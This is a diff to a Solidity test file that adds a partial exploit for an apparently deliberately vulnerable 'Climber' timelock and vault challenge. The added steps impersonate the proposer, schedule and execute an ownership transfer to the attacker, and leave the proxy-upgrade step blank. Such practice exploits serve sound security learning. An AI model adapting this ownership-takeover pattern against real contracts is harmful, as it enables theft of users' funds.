@@ -88,7 +88,39 @@ contract Climber is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
+        // 1. get access to timelock proposer role
+        // cheating for now
+        vm.prank(proposer);
 
+        // 2.1 prepare schedule call with transferownership
+        address[] memory climberVaultArr = new address[](1);
+        climberVaultArr[0] = (address(climberVaultProxy));
+        uint256[] memory valueArr = new uint256[](1);
+        valueArr[0] = 0;
+        bytes[] memory dataArr = new bytes[](1);
+        dataArr[0] = abi.encodeWithSignature(
+            "transferOwnership(address)",
+            attacker
+        );
+
+        // 2.2 schedule call on proxy w transferownership
+        climberTimelock.schedule(
+            climberVaultArr,
+            valueArr,
+            dataArr,
+            bytes32(0)
+        );
+
+        // 2.3 wait and execute transaction
+        vm.warp(block.timestamp + 2 hours);
+        vm.startPrank(attacker);
+        climberTimelock.execute(climberVaultArr, valueArr, dataArr, bytes32(0));
+
+        // 3. update proxy to malicious contract
+
+        // 4.
+
+        vm.stopPrank();
         /** EXPLOIT END **/
         validation();
     }
